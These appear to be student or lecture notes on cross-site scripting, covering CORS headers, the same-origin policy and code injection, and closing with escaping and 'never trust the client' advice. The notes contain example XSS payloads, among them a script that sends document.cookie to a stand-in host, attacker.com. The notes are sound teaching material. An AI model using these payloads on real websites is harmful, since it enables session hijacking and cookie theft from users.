### Cross-site scripting(XSS)

#### Cross-Origin Resource Sharing (CORS) 
- Allow origin https://site-a.com to read data:
     - Access-Control-Allow-Origin: https://site-a.com
- Allow any origin to read data:
    - Access-Control-Allow-Origin: *

Code and data being mixed in ways it is not intended to.

The Myspace incident.

XSS is a code injection vulnerability
- Untrusted user data with code combines for an XSS.


***Same origin policy prevents cross-origin DOM manipulation***

### XSS is a "code injection" vulnerabilty

- Code injection is caused when untrusted user data unexpectedly becomes code
- Any code that combines a command with user data is susceptible.
- In cross site scripting (XSS), the unexpected code is JavaScript in an HTML document
- In SQL injection, the unexpected code is extra SQL commands included a SQL query string

*What happens next?*

- If successful, attacker gains the ability to do anything the target can do through their browser
- Can view/exfiltrate their cookies
- Can send any HTTP request to the site, with the user's cookies!

### A Malicious search
- User input:`<script>alert(document.cookie)</script>`
- URL: example.com/?search=%3Cscript%3Ealert(document.cookie)%3C/script%3E
- Server input:
`<script>alert(document.cookie)</script>`
- Resulting page:
`<p>Search result for <script>alert(document.cookie)</script></p>`

### Session hijacking with XSS
- What if website is vulnerable to XSS?
    - Attacker can insert their code into the webpage 
    - At this point, they can easily exfiltrate the user's cookie

```HTML
<script>
    new Image().src =
        'https://attacker.com/steal?cookie=' + document.cookie
</script>
```
- Resulting page:
```HTML
<p>Search result for <script>new Image().src =
'https://attacker.com/steal?cookie=' + document.cookie
</script></p>
```

Fix the reflected XSS vulnerability using html-escape and check against the XSS-auditor to make sure.

## Big idea: Never trust the client
- Any data from the client controls is suspect!
- Client can send any data they want to the server

### What is XSS so prevalent?
- Data can be used in many different contexts
    - The web has so many different languages!
    - Even within HTML, there are at least 5 contexts to understand!
- Each context has different "control characters"
    - Some contexts have very complicated rules!
- If you slip up in even one place, you're completely vulnerable
 :wq
